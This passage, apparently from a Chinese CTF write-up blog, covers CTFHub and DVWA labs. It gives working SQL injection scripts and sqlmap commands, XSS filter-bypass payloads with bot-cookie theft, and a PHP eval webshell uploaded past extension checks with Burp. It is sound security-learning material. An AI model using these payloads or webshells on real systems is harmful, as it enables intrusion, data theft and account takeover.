3<br></code></pre></td></tr></table></figure><p>只是设置了level为3，其他什么都不给。结果一上来就提示UA是动态的，可注入。</p><p><img src="https://upyun.wuuconix.link/image-20210829123038111.png" alt="开局UA可注入" /></p><p><img src="https://upyun.wuuconix.link/image-20210829115536536.png" alt="sqlmap提示结果" /></p><p>它提示在UA这个参数这里有两种可能的注入，一种是时间盲注，一种是union联合注入，还都出了payload。</p><p>这确实非常强。为什么这里时间盲注也可以呢？这相当于不看页面的回显，直接用响应时间来判断，这么想来是不是大部分的sql注入都适合时间盲注2333。</p><p>当然自己注入的话，肯定会选择十分简单的union联合注入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u <span class="hljs-string">&quot;http://challenge-c1afe7c2c2a76623.sandbox.ctfhub.com:10800/&quot;</span> --level 3 -D sqli -T cqomjcukck --columns<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210829115822120.png" alt="sqlmap get flag" /></p><p>而且sqlmap有一个非常牛逼的点，它每次运行完都会把该网站的结果存在某个文件中，下次深入获得信息的时候会直接从文件中读取之前取得的成果，而不用从头开始，这大大提高了效率。</p><h3 id="refer注入"><a class="markdownIt-Anchor" href="#refer注入"></a> Refer注入</h3><p>和Cookie注入和UA注入类似，不多说了，只是换了一个地方。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>burp0_url = <span class="hljs-string">&quot;http://challenge-49bfa8cdc6c5744d.sandbox.ctfhub.com:10800/&quot;</span><br><span class="hljs-comment"># referer = &quot;1 and 1=2 union select 1, database()&quot;</span><br><span class="hljs-comment"># referer = &quot;1 and 1=2 union select 1, group_concat(table_name) from information_schema.tables where table_schema = &#x27;sqli&#x27;&quot;</span><br><span class="hljs-comment"># referer = &quot;1 and 1=2 union select 1, group_concat(column_name) from information_schema.columns where table_name = &#x27;sngrgwaxpk&#x27;&quot;</span><br>referer = <span class="hljs-string">&quot;1 and 1=2 union select 1, lwwwrezxpx from sngrgwaxpk&quot;</span><br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: referer&#125;<br><br><span class="hljs-built_in">print</span>(requests.get(burp0_url, headers=burp0_headers).text)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210829122302946.png" alt="refer flag" /></p><p><img src="https://upyun.wuuconix.link/image-20210829122339092.png" alt="burp refer flag" /></p><p>这道题貌似sqlmap就不太好使了。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> http://challenge-<span class="hljs-number">49</span>bfa8cdc6c5744d.<span class="hljs-keyword">sandbox</span>.ctfhub.<span class="hljs-keyword">com</span>:<span class="hljs-number">10800</span>/ --level <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210829122408424.png" alt="sqlmap结果" /></p><p>它发现了Referer是脆弱的，但是只检查出了时间盲注，没有检查出union注入。之后的时间盲注也一直失败。</p><p><img src="https://upyun.wuuconix.link/image-20210829122903203.png" alt="sqlmap time-based blind" /></p><p>当然也可能是我在中途选则选项的时候没有选好2333。</p><h3 id="过滤空格"><a class="markdownIt-Anchor" href="#过滤空格"></a> 过滤空格</h3><p>这道题过滤了空格，可以用注释符<code>/**/</code>来代替空格。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br>burp0_url = <span class="hljs-string">&quot;http://challenge-b018c199badc637a.sandbox.ctfhub.com:10800/?id=&quot;</span><br><span class="hljs-comment"># id = &quot;1/**/and/**/1=2/**/union/**/select/**/1,database()&quot;</span><br><span class="hljs-comment"># id = &quot;1/**/and/**/1=2/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/&#x27;sqli&#x27;&quot;</span><br><span class="hljs-comment"># id = &quot;1/**/and/**/1=2/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&#x27;lsoupzeglx&#x27;&quot;</span><br><span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1/**/and/**/1=2/**/union/**/select/**/1,pqmtlqzjwp/**/from/**/lsoupzeglx&quot;</span><br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://challenge-b018c199badc637a.sandbox.ctfhub.com:10800/?id=1&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br><span class="hljs-built_in">print</span>(requests.get(burp0_url + quote(<span class="hljs-built_in">id</span>), headers=burp0_headers).text)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210830104320532.png" alt="space flag" /></p><p>按理说用括号来代替也可以，但是括号的替换难度较大，可能我的姿势不对，没有成功。</p><p>用sqlmap的时候发现了一个功能，sqlmap原始的payload尝试应该都是用的空格来分隔的，所以它就会返回id不可注入的结果。</p><p>查阅资料后发现sqlmap有个叫做tamper的功能。实际上就是在tamper文件夹下有一些脚本。</p><p><img src="https://upyun.wuuconix.link/image-20210830104905439.png" alt="tamper脚本" /></p><p>这道题里就可以使用里面的<code>space2comment.py</code>脚本，把空格转化为注释符。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u <span class="hljs-string">&quot;http://challenge-b018c199badc637a.sandbox.ctfhub.com:10800/?id=1&quot;</span> -p <span class="hljs-built_in">id</span> --level 3 --tamper=<span class="hljs-string">&quot;space2comment.py&quot;</span><br></code></pre></td></tr></table></figure><p>运行后就可以发现sqlmap已经可以发现注入点了。</p><p><img src="https://upyun.wuuconix.link/image-20210830105043062.png" alt="注入点发现" /></p><p>虽然是时间盲注2333，可能sqlmap对页面的具体内容很难进行判断，无法在页面上获得<code>succcess_flag</code>，对它来说用页面相应的时间来说还更简单了2333。</p><p>到这里ctfhub的sql注入题目就做完了。</p><p><img src="https://upyun.wuuconix.link/image-20210830105259252.png" alt="ctfhub sql注入" /></p><h2 id="xss"><a class="markdownIt-Anchor" href="#xss"></a> XSS</h2><h3 id="反射型"><a class="markdownIt-Anchor" href="#反射型"></a> 反射型</h3><p>本来看ctfhub上有xss的题目，打算好好学习一波，结果点开一看，只有一道题2333。</p><p>便现在dvwa上熟悉了一波。所谓反射型是相对于存储型来讲的。</p><p>如果黑客的xss注入是通过某种方式储存到了数据库中，那就是存储型的，这种xss的特点就是每次访问该页面都会收到xss攻击，因为js语句已经放在数据库里了。</p><p>而反射型xss则不是这样，每次触发只能手动输入和点击才能触发。</p><p>我认为xss产生的原因主要是对html标签审查不严格造成的。</p><p>下面写一下dvwa中的三种难度的反射型xss。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// Low难度</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里没有对输入<code>$_GET['name']</code>做任何限制，我们完全可以在这个变量里写一个script标签。</p><p><img src="https://upyun.wuuconix.link/image-20210831234719702.png" alt="xss low" /></p><p><img src="https://upyun.wuuconix.link/image-20210831234812621.png" alt="成功弹出" /></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// Medium 难度</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里把输入里的<code>&lt;script&gt;</code>替换为了空字符。但是这里是大小写敏感的，我们完全可以大写绕过。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;<span class="hljs-title class_">Script</span>&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;medium&quot;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210831235040622.png" alt="medium" /></p><p><img src="https://upyun.wuuconix.link/image-20210831235118681.png" alt="medium xss" /></p><p>或者双拼绕过。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;scri&lt;script&gt;pt&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;medium&quot;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// High 难度</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最高难度用了正则匹配，并且大小写不敏感。上面两种方法都失效了。</p><p>但是它只过滤了<code>script</code>标签这种xss，还可以利用img标签报错来实现弹窗。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">0</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">high</span>&quot;)&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210831235704872.png" alt="high xss" /></p><p>然后我便开始做ctfhub的题目了。我试了一下，发现它没有任何验证，可以直接xss。</p><p><img src="https://upyun.wuuconix.link/image-20210901000322885.png" alt="ctfhub xss" /></p><p><img src="https://upyun.wuuconix.link/image-20210901000254656.png" alt="xss" /></p><p>但是我不知道flag会藏在哪里，xss的作用只是操控js，会不会藏在cookie里呢？</p><p><img src="https://upyun.wuuconix.link/image-20210901000435267.png" alt="cookie?" /></p><p><img src="https://upyun.wuuconix.link/image-20210901000451801.png" alt="没有flag" /></p><p>很不幸，没有flag。我陷入了人生和社会的大思考。</p><p>最终没法，看了writeup。发现需要利用到第二个输入框。</p><p><img src="https://upyun.wuuconix.link/image-20210901001128904.png" alt="第二个输入框" /></p><p>第二个输入框点击send之后就会显示<code>successfully</code>，但是这个它发送到哪里无法确定，这个网页用到Bootstrap，我不太熟悉。这可以肯定的是它有一个后端。</p><p>然后可以利用<a href="http://xsscom.com/">xss platform</a>来进行获得它与后端的信息。</p><p>在xss platform里新建一个项目然后复制其中的实例代码。</p><p><img src="https://upyun.wuuconix.link/image-20210901001617672.png" alt="xss-platform" /></p><p>把payload在第一个输入框提交，然后复制url到第二个输入框提交后，就会在xss platform里得到相应。</p><p><img src="https://upyun.wuuconix.link/image-20210901001826279.png" alt="大体情况" /></p><p><img src="https://upyun.wuuconix.link/image-20210901002047943.png" alt="cookie中的flag" /></p><p>下面进行战术总结</p><p>我们一开始直接用xss来看cookie，发现没有flag。我一开始觉得奇怪，觉得flag就应该藏到这个地方，不然还能藏哪呢？</p><p>我这里犯了一个原则性的错误。我们用xss一般的用途是什么？是获取cookie嘛？</p><p>是获取cookie，但更准确的说，是获取别人的cookie。</p><p>cookie相当于每个人的登录凭证，如果得到了别人的cookie，我们将可以不用输账号密码，直接登录。</p><p>所以flag一定是不可能藏在自己的cookie里的，自己的cookie没有意义，自己的cookie能直接浏览器控制台里知道，也不需要xss。ctf的题目应该是让我们获得别人的cookie，但是这是ctf的题目，不是公共的服务，没有其他用户，所以ctf模拟了一个机器人。</p><p><img src="https://upyun.wuuconix.link/image-20210901004325251.png" alt="bot" /></p><p>那就很清楚了，我们的目标就是获得这个机器人的Cookie，然后&quot;盗它的号&quot;，所以获取了这个机器人的Cookie就意味着成功。所以理所应当的，flag也就藏在cookie里了。</p><p>所以第二个文本框就是模拟别人点击这个包含xss的链接的情形。</p><h2 id="文件上传"><a class="markdownIt-Anchor" href="#文件上传"></a> 文件上传</h2><h3 id="无验证"><a class="markdownIt-Anchor" href="#无验证"></a> 无验证</h3><p>最简单的文件上传，传个php一句话木马即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;wuuconix&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210901113611321.png" alt="上传成功" /></p><p>之后用蚁剑连接就可以得到flag啦！</p><p><img src="https://upyun.wuuconix.link/image-20210901113721206.png" alt="antsword flag" /></p><h3 id="前端验证"><a class="markdownIt-Anchor" href="#前端验证"></a> 前端验证</h3><p>网页源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>CTFHub 文件上传 - js前端验证<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span> <span class="hljs-attr">onsubmit</span>=<span class="hljs-string">&quot;return checkfilesuffix()&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>Filename:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkfilesuffix</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> file=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&#x27;file&#x27;</span>)[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;value&#x27;</span>];</span><br><span class="language-javascript">    <span class="hljs-keyword">if</span>(file==<span class="hljs-string">&quot;&quot;</span>||file==<span class="hljs-literal">null</span>)</span><br><span class="language-javascript">    &#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;请添加上传文件&quot;</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">else</span></span><br><span class="language-javascript">    &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> whitelist=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-string">&quot;.jpg&quot;</span>,<span class="hljs-string">&quot;.png&quot;</span>,<span class="hljs-string">&quot;.gif&quot;</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> file_suffix=file.<span class="hljs-title function_">substring</span>(file.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span>(whitelist.<span class="hljs-title function_">indexOf</span>(file_suffix) == -<span class="hljs-number">1</span>)</span><br><span class="language-javascript">        &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;该文件不允许上传&quot;</span>);</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发现它在上传文件时调用了一个函数，这个函数只允许上传三种图片格式的文件。</p><p>这但是在前端验证，我们用burp抓包，先给它传一个<code>2.jpg</code>，先过前端验证，然后前端向后端请求的包会被burp抓到，这时候在请求包里包把文件名改成<code>2.php</code>就实现绕过前端验证并传马啦！</p><p>下面是原始请求包[节选]</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http">-----------------------------27707769729801775931606292902<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;2.jpg&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>image/jpeg<br><br>&lt;?php @eval($_POST[&#x27;wuuconix&#x27;]); ?&gt;<br>-----------------------------27707769729801775931606292902<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;submit&quot;<br><br>Submit<br>-----------------------------27707769729801775931606292902--<br></code></pre></td></tr></table></figure><p>我们只要把文件名改成以下即可。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http">-----------------------------27707769729801775931606292902<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;2.php&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>image/jpeg<br><br>&lt;?php @eval($_POST[&#x27;wuuconix&#x27;]); ?&gt;<br>-----------------------------27707769729801775931606292902<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;submit&quot;<br><br>Submit<br>-----------------------------27707769729801775931606292902--<br></code></pre></td></tr></table></figure><p>成功上传并连接。</p><p><img src="https://upyun.wuuconix.link/image-20210901115943047.png" alt="antsword连接" /></p><p>这也证明了一个事情，就是请求包里的<code>Content-Type</code>不改也行，只要后缀名是<code>php</code>，就能发挥它的职能，这个Content-Type应该只是传输过程中给服务器端的提示罢了，如果服务器端没有对该属性进行处理，那么它就是无效的。如果后台对这个Content-Type做了某种验证的话，我们就必须也得改了。</p><p>这是一种做法，既然验证代码在前端 ，可不可以直接把script标签删掉来绕过前端验证呢？</p><p>我试了一下，直接在源代码里把<code>script</code>标签删掉是掩耳盗铃，不能实现效果。但是如果利用Burp修改题目的Response，在相应里直接把<code>script</code>标签删掉就能够实现。</p><p>一般情况下Burp只是代理我们的请求，我还没有试过代理相应。</p><p>设置如下图。</p><p><img src="https://upyun.wuuconix.link/image-20210901120721028.png" alt="Burp代理相应" /></p><p>然后刷新一下页面，Forward一下，让自己的请求先发出去，然后你就会看到服务器的相应了。</p><p><img src="https://upyun.wuuconix.link/image-20210901120848381.png" alt="Burp实现代理相应" /></p><p>在这个相应里把script标签删掉。</p><p>这时渲染出来的页面就是真真切切没有script标签的了。</p><p><img src="https://upyun.wuuconix.link/image-20210901120931080.png" alt="源代码" /></p><p>能够直接上传php木马了。</p><h3 id="htaccess"><a class="markdownIt-Anchor" href="#htaccess"></a> .htaccess</h3><p>题目在注释中给出了后端php的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>    <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$name</span>)[<span class="hljs-string">&#x27;extension&#x27;</span>];<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php7&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$blacklist</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="hljs-variable">$name</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传文件相对路径&lt;br&gt;&quot;</span> . UPLOAD_URL_PATH . <span class="hljs-variable">$name</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span 